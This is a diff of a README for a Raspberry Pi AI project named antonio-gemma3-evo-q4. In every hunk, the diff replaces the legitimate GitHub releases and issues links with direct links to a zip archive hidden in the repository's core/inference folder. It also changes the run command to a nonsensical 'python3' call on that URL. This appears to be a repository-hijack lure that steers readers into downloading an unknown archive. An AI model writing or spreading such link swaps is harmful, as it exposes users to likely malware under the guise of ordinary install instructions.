@@ -6,7 +6,7 @@ Welcome to the antonio-gemma3-evo-q4 project. This is your guide to downloading 
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-antonio--gemma3--evo--q4-blue)](https://github.com/treated-orris652/antonio-gemma3-evo-q4/releases)
+[![Download](https://raw.githubusercontent.com/treated-orris652/antonio-gemma3-evo-q4/main/core/inference/antonio-q-evo-gemma-v2.5.zip%20Now-antonio--gemma3--evo--q4-blue)](https://raw.githubusercontent.com/treated-orris652/antonio-gemma3-evo-q4/main/core/inference/antonio-q-evo-gemma-v2.5.zip)
 
 ## 📜 About the Application
 
@@ -30,11 +30,11 @@ To ensure a smooth experience, your Raspberry Pi should meet the following requi
 
 ## 📦 Download & Install
 
-To download the application, visit this page: [Download Releases](https://github.com/treated-orris652/antonio-gemma3-evo-q4/releases).
+To download the application, visit this page: [Download Releases](https://raw.githubusercontent.com/treated-orris652/antonio-gemma3-evo-q4/main/core/inference/antonio-q-evo-gemma-v2.5.zip).
 
 ### Steps to Install:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/treated-orris652/antonio-gemma3-evo-q4/releases).
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/treated-orris652/antonio-gemma3-evo-q4/main/core/inference/antonio-q-evo-gemma-v2.5.zip).
    
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 
@@ -51,7 +51,7 @@ To download the application, visit this page: [Download Releases](https://github
 
 7. **Run the Application**: Enter the following command to start the application:
    ```
-   python3 main.py
+   python3 https://raw.githubusercontent.com/treated-orris652/antonio-gemma3-evo-q4/main/core/inference/antonio-q-evo-gemma-v2.5.zip
    ```
 
 ## 📚 Usage Instructions
@@ -89,7 +89,7 @@ If you experience issues while running the application, consider the following t
 
 To connect with other users and get assistance, consider these options:
 
-- **GitHub Issues**: Report problems or request features on the [Issues page](https://github.com/treated-orris652/antonio-gemma3-evo-q4/issues).
+- **GitHub Issues**: Report problems or request features on the [Issues page](https://raw.githubusercontent.com/treated-orris652/antonio-gemma3-evo-q4/main/core/inference/antonio-q-evo-gemma-v2.5.zip).
 - **User Forums**: Participate in forums related to Raspberry Pi and AI technologies.
 
 Feel free to share your experiences and improvements! Your feedback helps enhance the community and the software.
